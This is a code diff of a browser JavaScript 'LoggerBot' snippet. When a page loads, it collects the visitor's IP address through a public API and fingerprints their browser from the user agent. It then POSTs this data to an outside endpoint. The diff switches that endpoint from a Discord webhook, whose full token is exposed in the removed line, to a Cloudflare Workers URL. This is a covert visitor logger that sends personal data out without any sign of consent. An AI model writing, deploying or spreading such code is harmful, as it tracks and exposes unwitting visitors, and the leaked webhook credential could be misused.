@@ -1,5 +1,5 @@
 (async () => {
-    const webhookUrl = "https://discord.com/api/webhooks/1420791928005595277/OGHKicYHTzwtkMc3lX4LBpK3NCUYqud3CiA2hNPc4xWo2_cwsMeCah6-6pAoSyNR75tY";
+    const webhookUrl = "https://thingy.timofijferendovic.workers.dev/";
 
     // Get visitor IP via public API
     let ip = 'Unknown';
@@ -16,8 +16,8 @@
         const ua = navigator.userAgent;
         let name = "Unknown", version = "Unknown";
         if (/firefox/i.test(ua)) { name = "Firefox"; version = ua.match(/Firefox\/([\d.]+)/)[1]; }
-        else if (/chrome/i.test(ua)) { name = "Chrome"; version = ua.match(/Chrome\/([\d.]+)/)[1]; }
-        else if (/safari/i.test(ua)) { name = "Safari"; version = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown"; }
+        else if (/chrome/i.test(ua) && !/edg/i.test(ua)) { name = "Chrome"; version = ua.match(/Chrome\/([\d.]+)/)[1]; }
+        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) { name = "Safari"; version = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown"; }
         else if (/edg/i.test(ua)) { name = "Edge"; version = ua.match(/Edg\/([\d.]+)/)[1]; }
         return { name, version, ua };
     }
@@ -55,14 +55,14 @@
         timestamp: new Date().toISOString()
     };
 
-    // Send to Discord
+    // Send data to Worker (POST)
     fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             username: "LoggerBot",
             embeds: [{
-                title: "New Visitor Info 👀",
+                title: "New Visitor Info 🚀",
                 color: 0x1abc9c,
                 fields: Object.keys(visitorInfo).map(key => ({
                     name: key.charAt(0).toUpperCase() + key.slice(1),
